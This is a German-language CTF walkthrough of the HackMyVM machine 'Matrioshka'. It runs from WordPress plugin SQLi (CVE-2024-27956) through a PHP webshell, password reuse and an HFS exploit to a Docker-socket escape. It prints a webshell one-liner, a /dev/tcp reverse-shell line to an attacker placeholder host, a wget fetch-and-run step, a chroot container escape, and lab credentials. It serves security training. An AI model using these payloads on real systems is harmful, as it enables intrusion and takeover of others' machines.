# Matrioshka - HackMyVM - Medium: Writeup

![Matrioshka Banner/Logo](./path/to/your/banner_image.png) <!-- Optional: Füge hier einen Pfad zu einem Bild ein, falls du eines hast -->

**Ein detaillierter Walkthrough für die HackMyVM-Maschine "Matrioshka" (Schwierigkeitsgrad: Medium).**

---

## Inhaltsverzeichnis

*   [Über die Maschine](#über-die-maschine)
*   [Verwendete Tools](#verwendete-tools)
*   [Reconnaissance (Aufklärung)](#reconnaissance-aufklärung)
    *   [Netzwerk-Scan (arp-scan)](#netzwerk-scan-arp-scan)
    *   [Port-Scan (nmap)](#port-scan-nmap)
*   [Web Enumeration](#web-enumeration)
    *   [HTTP Header Analyse (curl)](#http-header-analyse-curl)
    *   [WordPress REST API Enumeration](#wordpress-rest-api-enumeration)
    *   [Verzeichnis-Bruteforce (gobuster/feroxbuster)](#verzeichnis-bruteforce-gobusterferoxbuster)
    *   [WordPress Scan (wpscan)](#wordpress-scan-wpscan)
*   [Initial Access (Initialer Zugriff)](#initial-access-initialer-zugriff)
    *   [Ausnutzung von WordPress Plugin Schwachstelle (CVE-2024-27956 - wp-automatic SQLi)](#ausnutzung-von-wordpress-plugin-schwachstelle-cve-2024-27956---wp-automatic-sqli)
    *   [Erlangen einer Webshell / Reverse Shell als www-data](#erlangen-einer-webshell--reverse-shell-als-www-data)
*   [Privilege Escalation (Rechteausweitung)](#privilege-escalation-rechteausweitung)
    *   [Benutzer 'matrioshka' - Passwortfund in Umgebungsvariablen](#benutzer-matrioshka---passwortfund-in-umgebungsvariablen)
    *   [Enumeration als 'matrioshka'](#enumeration-als-matrioshka)
    *   [Identifizierung des HFS Servers](#identifizierung-des-hfs-servers)
    *   [Proof of Concept: Ausnutzung HFS (angelehnt an CVE-2024-39943 - RCE als Root)](#proof-of-concept-ausnutzung-hfs-angelehnt-an-cve-2024-39943---rce-als-root)
    *   [Docker Escape zur Host-Root-Kompromittierung](#docker-escape-zur-host-root-kompromittierung)
*   [Erlangte Flags](#erlangte-flags)
*   [Fazit und Learnings](#fazit-und-learnings)
*   [Disclaimer](#disclaimer)

---

## Über die Maschine

*   **Name:** Matrioshka
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad:** Medium
*   **Link zur Maschine:** (Hier Link zur Maschine einfügen, falls bekannt)
*   **Kurzbeschreibung:** Diese Maschine beinhaltet die Ausnutzung von WordPress-Schwachstellen für den initialen Zugriff, gefolgt von einer Privilegieneskalation durch Ausnutzung eines falsch konfigurierten Dienstes (HFS) und schließlich einem Docker-Escape, um volle Root-Rechte auf dem Host zu erlangen.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `curl`
*   `jq`
*   `gobuster`
*   `wpscan`
*   `feroxbuster`
*   `nuclei`
*   `git`
*   Python
*   `zip`
*   `nc` (Netcat)
*   `ssh`
*   `socat`
*   `pspy64`
*   `busybox`
*   `vi`/`nano`
*   `md5sum`
*   `find`
*   `env`
*   `docker` (CLI)

---

## Reconnaissance (Aufklärung)

### Netzwerk-Scan (arp-scan)

IP-Adresse des Ziels wurde mit `arp-scan` identifiziert.
```bash
arp-scan -l | grep "PCS" | awk '{print $1}'
# Ausgabe: 192.168.2.180

    

IGNORE_WHEN_COPYING_START
Use code with caution. Markdown
IGNORE_WHEN_COPYING_END

Die IP 192.168.2.180 wurde der /etc/hosts als matrioshka.hmv hinzugefügt.
Port-Scan (nmap)

Ein umfassender Nmap-Scan offenbarte offene Ports und Dienste.

      
nmap -sC -sS -sV -T5 -A 192.168.2.180 -p-

    

IGNORE_WHEN_COPYING_START
Use code with caution. Bash
IGNORE_WHEN_COPYING_END

    Port 22/tcp: OpenSSH 9.2p1 Debian

    Port 80/tcp: Apache httpd 2.4.61 (Debian), Titel "mamushka"

Web Enumeration
HTTP Header Analyse (curl)

      
curl -Iv http://matrioshka.hmv

    

IGNORE_WHEN_COPYING_START
Use code with caution. Bash
IGNORE_WHEN_COPYING_END

Die Header zeigten X-Powered-By: PHP/8.2.22 und einen Link-Header zu http://mamushka.hmv/index.php?rest_route=/, was auf WordPress hindeutet. mamushka.hmv wurde ebenfalls zur /etc/hosts hinzugefügt.
WordPress REST API Enumeration

      
curl http://mamushka.hmv/index.php?rest_route=/ -s | jq

     
Bestätigte WordPress und listete API-Namespaces und Routen auf.
Verzeichnis-Bruteforce (gobuster/feroxbuster)

      
gobuster dir -u "http://matrioshka.hmv" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt ...

     
Standard-WordPress-Pfade wie /wp-admin, /wp-content, /wp-login.php, /xmlrpc.php wurden gefunden.
WordPress Scan (wpscan)

      
wpscan --url http://matrioshka.hmv/ --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive --api-token YOUR_WPSCAN_API_TOKEN
 
WPScan identifizierte mehrere Plugins und deren Schwachstellen:

    ultimate-member (Version 2.8.6): Mehrere CVEs, darunter SQL-Injections.

    wp-automatic: Version unbekannt, aber zahlreiche CVEs gelistet, darunter:

        CVE-2024-27956: Unauthentifizierte SQL Injection

        CVE-2024-27954: Unauthenticated Arbitrary File Download / SSRF

Initial Access (Initialer Zugriff)
Ausnutzung von WordPress Plugin Schwachstelle (CVE-2024-27956 - wp-automatic SQLi)

Ein öffentlicher Exploit für CVE-2024-27956 wurde verwendet, um einen neuen Administrator-Benutzer zu erstellen.

      
# Exploit von https://github.com/diego-tella/CVE-2024-27956-RCE
python exploit.py http://192.168.2.180/
 

Ergebnis: Administrator eviladmin mit Passwort admin wurde erstellt.
Erlangen einer Webshell / Reverse Shell als www-data

Nach Login als eviladmin wurde über den WordPress Theme-Editor (twentytwentythree/patterns/hidden-404.php) eine einfache PHP-Webshell platziert:

      
<?php system($_GET["cmd"]); ?>
 

Alternativ wurde ein Plugin (shell2.zip) mit einer PHP-Shell hochgeladen und aktiviert.
Mit der Webshell wurde eine Reverse Shell zu unserem Listener aufgebaut:

      
# Listener auf Angreifer-Maschine
nc -lvnp 4445

    
 

Wir erhielten eine Shell als www-data.
Privilege Escalation (Rechteausweitung)
Benutzer 'matrioshka' - Passwortfund in Umgebungsvariablen

Als www-data wurden die Umgebungsvariablen ausgelesen:

      
env

     

Dabei wurde das Datenbankpasswort gefunden: WORDPRESS_DB_PASSWORD=Fukurokuju für den User WORDPRESS_DB_USER=matrioska.
Dieses Passwort ermöglichte den SSH-Login als Benutzer matrioshka:

      
ssh matrioshka@192.168.2.180 # Passwort: Fukurokuju
 

    sudo -l: ergab keine Sudo-Rechte für matrioshka.

    Die User-Flag wurde in ~/user.txt gefunden.

    ss -tulpe zeigte lokal lauschende Dienste, darunter:

        Port 9090 (127.0.0.1): HFS (HTTP File Server)

        Port 8080 (127.0.0.1): Apache/PHP (WordPress-Instanz)

Identifizierung des HFS Servers

      
curl -v http://127.0.0.1:9090
 
Der Dienst wurde als HFS Version 0.52.9 identifiziert.
Proof of Concept: Ausnutzung HFS (angelehnt an CVE-2024-39943 - RCE als Root)

Der HFS-Dienst lief als Root (oder in einem als Root laufenden Docker-Container).

    Port Forwarding: socat TCP-LISTEN:8000,fork TCP4:172.19.0.2:80 & (wobei 172.19.0.2 die interne IP des HFS-Containers war).

    HFS Admin Login: Zugriff auf http://192.168.2.180:8000 und Login mit admin:admin.

    Exploit Vorbereitung: Ein Exploit für HFS 0.52.9 (z.B. PoC für CVE-2024-39943) wurde verwendet.

        Admin-Cookie wurde aus dem Browser extrahiert.

        Das Exploit-Skript wurde ausgeführt, um den Upload von busybox nach /tmp/ im HFS-Container zu ermöglichen.

    Reverse Shell Payload:

        Auf matrioshka wurde revshell.sh erstellt: bash -i >& /dev/tcp/ATTACKER_DOCKER_IP/5555 0>&1

        Ein Python HTTP-Server wurde auf matrioshka gestartet: python3 -m http.server 8001.

    Exploit Ausführung: Der HFS-Exploit wurde genutzt, um busybox im Container auszuführen, revshell.sh herunterzuladen (wget MATRIOSHKA_IP:8001/revshell.sh -O /tmp/revshell.sh), ausführbar zu machen und zu starten.

        Ein Listener auf ATTACKER_DOCKER_IP:5555 empfing die Shell.

Wir erhielten eine Shell als root innerhalb des HFS-Docker-Containers (root-39cfe3c81ea8).
Docker Escape zur Host-Root-Kompromittierung

Als Root im HFS-Container wurde festgestellt, dass der Docker-Socket gemountet war oder Docker-Befehle ausgeführt werden konnten.

      
# Im HFS-Container als Root
docker ps # Zeigt laufende Container auf dem Host
docker run -v /:/mnt --rm -it ubuntu:20.04 chroot /mnt bash
 

In der neuen Shell (die Root-Zugriff auf das Host-Dateisystem hat):

      
cd /root
cat root.txt

    

IGNORE_WHEN_COPYING_START
Use code with caution. Bash
IGNORE_WHEN_COPYING_END
Erlangte Flags

    User Flag (user.txt): c8129b0390452d8378535cff76e0dde8

    Root Flag (root.txt): 7f5d6dbbaff0a1fc6d2a5c9160362908

Fazit und Learnings

Matrioshka ist eine lehrreiche Maschine, die mehrere Eskalationspfade kombiniert. Die wichtigsten Learnings umfassen:

    Die Gefahr veralteter WordPress-Plugins (hier wp-automatic und ultimate-member).

    Passwort-Wiederverwendung (DB-Passwort = SSH-Passwort).

    Risiken durch falsch konfigurierte oder veraltete interne Dienste (HFS mit Standard-Credentials und bekannter Schwachstelle).

    Kritische Risiken durch unsichere Docker-Konfigurationen (Zugriff auf Docker-Socket vom Container aus).

Regelmäßige Updates, starke und einzigartige Passwörter sowie eine sichere Konfiguration aller Systemkomponenten, einschließlich Container-Umgebungen, sind unerlässlich.
Disclaimer

Dieses Writeup dient ausschließlich zu Bildungszwecken. Die hier beschriebenen Techniken sollten nur in legalen und autorisierten Umgebungen (wie HackMyVM, CTFs, eigene Testsysteme) angewendet werden. Der Autor übernimmt keine Haftung für Missbrauch.

Autor: DarkSpirit (Dein GitHub Profil-Link)
Datum des Writeups: (Aktuelles Datum einfügen, z.B. 07. Mai 2024)
